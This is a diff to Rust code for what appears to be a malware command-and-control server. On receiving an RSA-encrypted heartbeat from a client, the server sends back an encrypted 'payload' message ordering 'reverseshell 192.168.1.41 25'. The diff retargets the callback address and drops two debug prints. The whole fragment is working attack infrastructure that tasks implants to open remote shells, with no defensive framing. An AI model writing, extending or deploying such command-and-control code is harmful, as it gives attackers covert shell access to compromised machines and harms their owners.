@@ -171,13 +171,11 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
             Ok(n) => {
                 let dec_data = srv_priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &data[..n]).expect("failed to decrypt");
                 assert_ne!(&dec_data, &data[..n]);
-                println!("read {} bytes", n);
-                println!("Heartbeat recieved");
                 let message_to_send = Message {
                     user_sender: "Server".to_string(),
                     user_receiver:"user".to_string(),
                     message_type:  "payload".to_string(),
-                    message_content: "reverseshell 192.168.1.107 25".to_string(),
+                    message_content: "reverseshell 192.168.1.41 25".to_string(),
                 };
                 let json_message = serde_json::to_string(&message_to_send).unwrap();
                 let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
